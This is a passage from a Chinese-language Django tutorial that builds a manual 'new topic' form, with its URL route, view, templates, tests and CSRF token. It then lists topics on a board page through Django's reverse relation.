endblock %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问浏览器：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20503django01.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20503django02.png" alt=""></p><p>这里使用的 HTML 是 Bootstrap 4 Navbar 组件 的一部分。</p><h2 id="表单处理"><a href="#表单处理" class="headerlink" title="表单处理"></a>表单处理</h2><p>Forms(表单) 用来处理我们的输入。这在任何 web 应用或者网站中都是很常见的任务。标准的做法是通过 HTML 表单实现，用户输入一些数据，将其提交给服务器，然后服务器处理它。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20503django03.png" alt=""></p><p>表单处理是一项非常复杂的任务，因为它涉及到与应用多个层面的交互。有很多需要关心的问题。例如，提交给服务器的所有数据都是字符串的形式，所以在我们使用它之前需要将其转换为需要的数据类型(整形，浮点型，日期等)。我们必须验证有关应用程序业务逻辑的数据。我们还需要妥善地清理和审查数据，以避免一些诸如 SQL 注入和 XSS 攻击等安全问题。</p><p>好消息是，Django Forms API 使整个过程变的更加简单，从而实现了大量工作的自动化。而且，最终的结果比大多数程序员自己去实现的代码更加安全。所以，不管 HTML 的表单多么简单，总是使用Form API。</p><h3 id="自己实现表单"><a href="#自己实现表单" class="headerlink" title="自己实现表单"></a>自己实现表单</h3><p>起初，我想直接跳到表单 API。但是我觉得花点时间去了解一下表单处理的基本细节是一个不错的主意。否则，这玩意儿将会看起来像魔术一样，这是一件坏事，因为当出现错误时，你将不知道怎么去找到问题所在。</p><p>随着对一些编程概念的深入理解，我们可以感觉到自己能更好地掌控一些情况。掌控是很重要的，因为它让我们写代码的时候更有信心。一旦我们能确切地知道发生了什么，实现可预见行为的代码就容易多了。调试和查找错误也变得很容易，因为你知道去哪里查找。</p><p>无论如何，让我们开始实现下面的表单：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20503django04.png" alt=""></p><p>这是我们在前面学习绘制的线框图。我现在意识到这个可能是一个不好的例子，因为这个特殊的表单涉及到处理两个不同模型数据：<strong>Topic(subject)</strong> 和 <strong>Post(message)</strong>。</p><p>还有一点很重要的我们到现在为止还没讨论过，就是用户认证。我们应该只为登录认证过的用户去显示这个页面。通过这种方式，我们才能知道是谁创建了 <strong>Topic 或者 Post</strong>。</p><p>现在让我们抽象一些细节，重点了解一下怎么在数据库中保存用户的输入。</p><p>首先，先创建一个新的 URL 路由，命名为 <strong>new_topic</strong>：</p><p><strong>myproject/urls.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> boards <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^$'</span>, views.home, name=<span class="string">'home'</span>),</span><br><span class="line">    url(<span class="string">r'^boards/(?P&lt;pk&gt;\d+)/$'</span>, views.board_topics, name=<span class="string">'board_topics'</span>),</span><br><span class="line">    url(<span class="string">r'^boards/(?P&lt;pk&gt;\d+)/new/$'</span>, views.new_topic, name=<span class="string">'new_topic'</span>),</span><br><span class="line">    url(<span class="string">r'^admin/'</span>, admin.site.urls),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>我们创建的这个 URL 能帮我们标识正确的 <strong>Board</strong></p><p>现在来创建<strong>new_topic</strong> 的 视图函数：</p><p><strong>boards/views.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, get_object_or_404</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_topic</span><span class="params">(request, pk)</span>:</span></span><br><span class="line">    board = get_object_or_404(Board, pk=pk)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'new_topic.html'</span>, &#123;<span class="string">'board'</span>: board&#125;)</span><br></pre></td></tr></table></figure><p>目前为止， <strong>new_topic</strong> 的视图函数看起来和 <strong>board_topics</strong> 恰好相同。这是故意的，让我们一步步地来。</p><p>现在我们需要一个名为 <strong>new_topic.html</strong> 的模板：</p><p><strong>templates/new_topic.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Start a New Topic&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block breadcrumb %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'home' %&#125;"</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'board_topics' board.pk %&#125;"</span>&gt;</span>&#123;&#123; board.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>New topic<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>现在我们只有 breadcrumb 导航。注意我们包含了返回到 <strong>board_topics</strong> 视图 URL。</p><p>访问浏览器：<code>http://127.0.0.1:8000/boards/1/new/</code></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20503django05.png" alt=""></p><p>我们依然还没有实现到达这个新页面的方法，但是如果我们将 URL 改为 <code>http://127.0.0.1:8000/boards/2/new/</code>，它会把我们带到 <strong>Python Board</strong> 的页面：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20503django06.png" alt=""></p><blockquote><p>注意：如果你没有跟着上一节课程一步步地做，你的结果和我的可能有些不一样。在我这个例子中，我的数据库有 3 个 Board 实例，分别是 Django = 1, Python = 2, 和 Random = 3。这些数字是数据库中的 ID，用来找到正确的资源。</p></blockquote><p>我们可以增加一些测试了：</p><p><strong>boards/tests.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.core.urlresolvers <span class="keyword">import</span> reverse</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> resolve</span><br><span class="line"><span class="keyword">from</span> django.test <span class="keyword">import</span> TestCase</span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> home, board_topics, new_topic</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoardTopicsTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NewTopicTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        Board.objects.create(name=<span class="string">'Django'</span>, description=<span class="string">'Django board.'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_new_topic_view_success_status_code</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = reverse(<span class="string">'new_topic'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        response = self.client.get(url)</span><br><span class="line">        self.assertEquals(response.status_code, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_new_topic_view_not_found_status_code</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = reverse(<span class="string">'new_topic'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">99</span>&#125;)</span><br><span class="line">        response = self.client.get(url)</span><br><span class="line">        self.assertEquals(response.status_code, <span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_new_topic_url_resolves_new_topic_view</span><span class="params">(self)</span>:</span></span><br><span class="line">        view = resolve(<span class="string">'/boards/1/new/'</span>)</span><br><span class="line">        self.assertEquals(view.func, new_topic)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_new_topic_view_contains_link_back_to_board_topics_view</span><span class="params">(self)</span>:</span></span><br><span class="line">        new_topic_url = reverse(<span class="string">'new_topic'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        board_topics_url = reverse(<span class="string">'board_topics'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        response = self.client.get(new_topic_url)</span><br><span class="line">        self.assertContains(response, <span class="string">'href="&#123;0&#125;"'</span>.format(board_topics_url))</span><br></pre></td></tr></table></figure><p>关于我们的测试中新的 NewTopicTests 类的快速总结：</p><ul><li><p><strong>setUp</strong>：创建一个测试中使用的 *<em>Board *</em>实例</p></li><li><p><strong>test_new_topic_view_success_status_code</strong>：检查发给 view 的请求是否成功</p></li><li><p><strong>test_new_topic_view_not_found_status_code</strong>：检查当 <strong>Board</strong> 不存在时 view 是否会抛出一个 404 的错误</p></li><li><p><strong>test_new_topic_url_resolves_new_topic_view</strong>：检查是否正在使用正确的 view</p></li><li><p><strong>test_new_topic_view_contains_link_back_to_board_topics_view</strong>：确保导航能回到 topics 的列表</p></li></ul><p>运行测试：</p><p><code>python manage.py test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Creating test database for alias &#39;default&#39;...</span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">...........</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 11 tests in 0.046s</span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line">Destroying test database for alias &#39;default&#39;...</span><br></pre></td></tr></table></figure><p>成功，现在我们可以去开始创建表单了。</p><p><strong>templates/new_topic.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Start a New Topic&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block breadcrumb %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'home' %&#125;"</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'board_topics' board.pk %&#125;"</span>&gt;</span>&#123;&#123; board.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>New topic<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"id_subject"</span>&gt;</span>Subject<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"id_subject"</span> <span class="attr">name</span>=<span class="string">"subject"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"id_message"</span>&gt;</span>Message<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"id_message"</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">rows</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-success"</span>&gt;</span>Post<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>这是一个使用 Bootstrap 4 提供的 CSS 类手动创建的 HTML 表单。访问浏览器：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20503django07.png" alt=""></p><p>在 <code>&lt;form&gt;</code> 标签中，我们定义了 <code>method</code> 属性。它会告诉浏览器我们想如何与服务器通信。HTTP 规范定义了几种 request methods(请求方法)。但是在大部分情况下，我们只需要使用 <strong>GET</strong> 和 <strong>POST</strong> 两种 request(请求)类型。</p><p><strong>GET</strong> 可能是最常见的请求类型了。它用于从服务器请求数据。每当你点击了一个链接或者直接在浏览器中输入了一个网址时，你就创建一个 <strong>GET</strong> 请求。</p><p><strong>POST</strong> 用于当我们想更改服务器上的数据的时候。一般来说，每次我们发送数据给服务器都会导致资源状态的变化，我们应该使用 <strong>POST</strong> 请求发送数据。</p><p>Django 使用 <strong>CSRF Token</strong>(Cross-Site Request Forgery Token) 保护所有的 <strong>POST</strong> 请求。这是一个避免外部站点或者应用程序向我们的应用程序提交数据的安全措施。应用程序每次接收一个 <strong>POST</strong> 时，都会先检查 <strong>CSRF Token</strong>。如果这个 request 没有 token，或者这个 token是无效的，它就会抛弃提交的数据。</p><p><strong>csrf_token</strong> 的模板标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% csrf_token %&#125;</span><br></pre></td></tr></table></figure><p>它是与其他表单数据一起提交的隐藏字段：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrfmiddlewaretoken"</span> <span class="attr">value</span>=<span class="string">"jG2o6aWj65YGaqzCpl0TYTg5jn6SctjzRZ9KmluifVx0IVaxlwh97YarZKs54Y32"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>另外一件事是，我们需要设置 HTML 输入的 <strong>name，name</strong> 将被用来在服务器获取数据。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"id_subject"</span> <span class="attr">name</span>=<span class="string">"subject"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"id_message"</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">rows</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是示范我们如何检索数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subject = request.POST[<span class="string">'subject'</span>]</span><br><span class="line">message = request.POST[<span class="string">'message'</span>]</span><br></pre></td></tr></table></figure><p>所以，从 HTML 获取数据并且开始一个新的 topic 视图的简单实现可以这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> User</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, redirect, get_object_or_404</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board, Topic, Post</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_topic</span><span class="params">(request, pk)</span>:</span></span><br><span class="line">    board = get_object_or_404(Board, pk=pk)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        subject = request.POST[<span class="string">'subject'</span>]</span><br><span class="line">        message = request.POST[<span class="string">'message'</span>]</span><br><span class="line"></span><br><span class="line">        user = User.objects.first()  <span class="comment"># <span class="doctag">TODO:</span> 临时使用一个账号作为登录用户</span></span><br><span class="line"></span><br><span class="line">        topic = Topic.objects.create(</span><br><span class="line">            subject=subject,</span><br><span class="line">            board=board,</span><br><span class="line">            starter=user</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        post = Post.objects.create(</span><br><span class="line">            message=message,</span><br><span class="line">            topic=topic,</span><br><span class="line">            created_by=user</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'board_topics'</span>, pk=board.pk)  <span class="comment"># <span class="doctag">TODO:</span> redirect to the created topic page</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'new_topic.html'</span>, &#123;<span class="string">'board'</span>: board&#125;)</span><br></pre></td></tr></table></figure><p>这个视图函数只考虑能接收数据并且保存进数据库的乐观合法的 path，但是还缺少一些部分。我们没有验证数据。用户可以提交空表单或者提交一个大于 255 个字符的 <strong>subject</strong>。</p><p>到目前为止我们都在对 <strong>User</strong> 字段进行硬编码，因为我们还没有实现身份验证。有一个简单的方法来识别登录的用户。我们会在下一个课程将这一块。此外，我们还没有实现列出 topic 的所有 posts 的视图，实现了它，我们就可以将用户重定向到列出所有主题的列表页面。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20503django08.png" alt=""></p><p>点击 Post 按钮提交表单：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20503django09.png" alt=""></p><p>看起来成功了。但是我们还没有实现主题的列表页面，所以没有东西可以看。让我们来编辑 <strong>templates/topics.html</strong> 来实现一个合适的列表：</p><p><strong>templates/topics.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;</span><br><span class="line">  &#123;&#123; board.name &#125;&#125; - &#123;&#123; block.super &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block breadcrumb %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'home' %&#125;"</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>&#123;&#123; board.name &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span> <span class="attr">class</span>=<span class="string">"thead-inverse"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Topic<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Starter<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Replies<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Views<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Last Update<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">      &#123;% for topic in board.topics.all %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; topic.subject &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; topic.starter.username &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">td</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">td</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; topic.last_updated &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>访问浏览器：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20503django10.png" alt=""></p><p>我们创建的 <strong>Topic</strong> 显示在这上面了。</p><p>这里有两个新概念。</p><p>我们首次使用 <strong>Board</strong> 模型中的 <strong>topics</strong> 属性。<strong>topics</strong> 属性由 Django 使用反向关系自动创建。在之前的步骤中，我们创建了一个 Topic 实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_topic</span><span class="params">(request, pk)</span>:</span></span><br><span class="line">    board = get_object_or_404(Board, pk=pk)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">    topic = Topic.objects.create(</span><br><span class="line">        subject=subject,</span><br><span class="line">        board=board,</span><br><span class="line">        starter=user</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>在 <code>board=board</code> 这行，我们设置了 <strong>Topic</strong> 模型中的 board 字段，它是 <code>ForeignKey(Board)</code>。因此，我们的 Board 实例就知道了与它关联的 <strong>Topic</strong> 实例。</p><p>之所以我们使用 <code>board.topics.all</code> 而不是 <code>board.topics</code>，是因为 <code>board.topics</code> 是一个 <strong>Related Manager</strong>,它与 <strong>Model Manager</strong> 很相似，通常在 <code>board.objects</code> 可得到。所以，要返回给定 board 的所有 topic 我们必须使用 <code>board.topics.all()</code>，要过滤一些数据，我们可以这样用 <code>board.topics.filter(subject__contains=&#39;Hello&#39;)</code>。</p><p>另一个需要注意的是，在 Python 代码中，我们必须使用括号：<code>board.topics.all()</code>，因为 <code>all()</code> 是一个方法。在使用 Django 模板语言写代码的时候，在一个 HTML 模板文件里面，我们不使用括号，就只是 <code>board.topics.all</code>。</p><p>第二件事是我们在使用 